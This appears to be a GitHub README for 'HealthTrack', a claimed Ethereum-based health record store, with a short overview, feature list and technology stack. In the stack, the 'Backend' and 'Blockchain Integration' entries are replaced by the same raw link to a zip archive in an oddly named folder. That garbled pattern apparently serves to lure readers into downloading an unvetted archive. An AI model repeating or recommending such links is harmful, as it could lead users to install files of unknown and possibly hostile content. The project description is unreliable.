# HealthTrack - Decentralized Health Record Storer

## Overview

HealthTrack is a blockchain-based electronic health record (EHR) registry designed to provide secure and decentralized storage of patient records. By leveraging the Ethereum blockchain, HealthTrack ensures that patient data is safely managed, authenticated, and stored without relying on a centralized authority.

## Key Features

- **Decentralized Record Storage:** Patient records are securely stored on the Ethereum blockchain, ensuring data integrity and privacy.
- **Patient Authentication:** Integrated smart contracts handle patient authentication, guaranteeing that only authorized individuals can access records.
- **Record Management:** Provides an easy-to-use interface for patients and healthcare providers to manage health records, with secure data handling via smart contracts.

## Technology Stack

- **Frontend:** ReactJS
- **Smart Contracts:** Solidity, Hardhat
- **Backend:** https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip, ExpressJS
- **Blockchain Integration:** https://raw.githubusercontent.com/sakshi-code-cse/HealthTrack/master/thankfully/HealthTrack.zip
